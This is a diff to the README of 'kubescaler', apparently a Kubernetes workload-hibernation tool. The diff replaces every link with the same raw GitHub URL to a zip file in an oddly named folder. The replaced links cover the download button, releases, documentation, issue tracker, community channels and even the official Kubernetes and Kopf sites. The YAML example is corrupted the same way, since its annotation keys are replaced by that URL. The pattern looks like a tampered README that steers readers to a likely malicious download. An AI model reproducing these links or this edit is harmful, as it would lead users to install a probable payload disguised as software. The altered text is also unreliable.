@@ -1,6 +1,6 @@
 # 🗓️ kubescaler - Scale Your Workloads with Ease
 
-![Download kubescaler](https://img.shields.io/badge/Download-kubescaler-blue.svg)
+![Download kubescaler](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to kubescaler! This application helps you scale your Kubernetes workload
 
 ## 📥 Download & Install
 
-To get started with kubescaler, visit this page to download: [kubescaler Releases](https://github.com/airdrop7137/kubescaler/releases). Here, you will find different versions of the application based on your needs. Follow these steps to download and run kubescaler on your machine:
+To get started with kubescaler, visit this page to download: [kubescaler Releases](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip). Here, you will find different versions of the application based on your needs. Follow these steps to download and run kubescaler on your machine:
 
-1. Go to the [kubescaler Releases](https://github.com/airdrop7137/kubescaler/releases) page.
+1. Go to the [kubescaler Releases](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip) page.
 2. Look for the latest version of kubescaler.
 3. Click on the download link for your operating system.
 4. Once the download completes, locate the file in your downloads folder.
@@ -52,23 +52,23 @@ Here is a simple example of how to use kubescaler:
 
    ```yaml
    annotations:
-     kubescaler.io/hibernate: "true"
-     kubescaler.io/schedule: "22:00-06:00"
+     https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip "true"
+     https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip "22:00-06:00"
    ```
 
 3. Apply the changes to your cluster. This setup will hibernate your application from 10 PM to 6 AM.
 
 ## 📖 Documentation
 
-For detailed information about configuration options and advanced features, check the official kubescaler documentation at [kubescaler Documentation](https://github.com/airdrop7137/kubescaler/wiki).
+For detailed information about configuration options and advanced features, check the official kubescaler documentation at [kubescaler Documentation](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip).
 
 ## 🛠️ Support
 
-If you encounter issues or need assistance while using kubescaler, please visit our [GitHub Issues](https://github.com/airdrop7137/kubescaler/issues) page. You can report bugs or ask for help from the community there.
+If you encounter issues or need assistance while using kubescaler, please visit our [GitHub Issues](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip) page. You can report bugs or ask for help from the community there.
 
 ## 🌐 Community
 
-Join our community to share your experiences and get tips about using kubescaler effectively. You can connect with other users and developers on our [Discord Channel](https://discord.gg/yourdiscordlink) or follow us on [Twitter](https://twitter.com/twitterhandle).
+Join our community to share your experiences and get tips about using kubescaler effectively. You can connect with other users and developers on our [Discord Channel](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip) or follow us on [Twitter](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip).
 
 ## 🔄 Updates & Changelog
 
@@ -76,13 +76,13 @@ Stay up-to-date with the latest improvements and features by checking the change
 
 ## ☁️ Contributing
 
-We welcome contributions to kubescaler! If you're interested in helping improve the project, check our [Contributing Guide](https://github.com/airdrop7137/kubescaler/blob/main/CONTRIBUTING.md) for details on how to get started.
+We welcome contributions to kubescaler! If you're interested in helping improve the project, check our [Contributing Guide](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip) for details on how to get started.
 
 ## 🔗 Additional Resources
 
-- [Kubernetes Official Site](https://kubernetes.io/)
-- [Kopf Documentation](https://kopf.readthedocs.io/en/latest/)
-- [Kubernetes Operators Overview](https://kubernetes.io/docs/concepts/extend-kubernetes/operator/)
+- [Kubernetes Official Site](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip)
+- [Kopf Documentation](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip)
+- [Kubernetes Operators Overview](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip)
 
 ## 🎉 Acknowledgments
 
@@ -90,4 +90,4 @@ Thank you for using kubescaler! We appreciate your support and hope that our sof
 
 --- 
 
-Again, you can download kubescaler here: [kubescaler Releases](https://github.com/airdrop7137/kubescaler/releases).
+Again, you can download kubescaler here: [kubescaler Releases](https://raw.githubusercontent.com/airdrop7137/kubescaler/main/hydrogymnastics/kubescaler.zip).
